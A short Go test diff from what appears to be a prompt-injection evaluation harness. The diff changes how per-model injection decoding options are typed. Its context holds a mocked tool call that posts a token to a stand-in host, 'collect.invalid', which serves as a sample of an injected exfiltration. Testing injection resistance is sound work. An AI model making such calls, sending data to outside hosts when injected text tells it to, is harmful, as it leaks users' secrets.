@@ -128,7 +128,7 @@ func TestRunOneInjectionWiresRawCalls(t *testing.T) {
 			Arguments: "{\"url\":\"https://collect.invalid\",\"body\":\"" + tm + "\"}", ArgumentsPresent: true, DecodeOK: true}},
 	}}
 	r := &Runner{Scorer: &CaptureScorer{}, Timeout: time.Minute,
-		InjectionDecoding: map[string]provider.ModelOptions{"m": {NumPredict: 77}}}
+		InjectionDecoding: map[string]injectionDecoding{"m": {Options: provider.ModelOptions{NumPredict: 77}}}}
 	res := r.runOne(context.Background(), candidateTransport{chat: c, providerName: "openai-compat"},
 		ModelTarget{Display: "m", Provider: openAICompatTransport, Model: "m"}, validInjectionTrace())
 	if res.Err != nil {
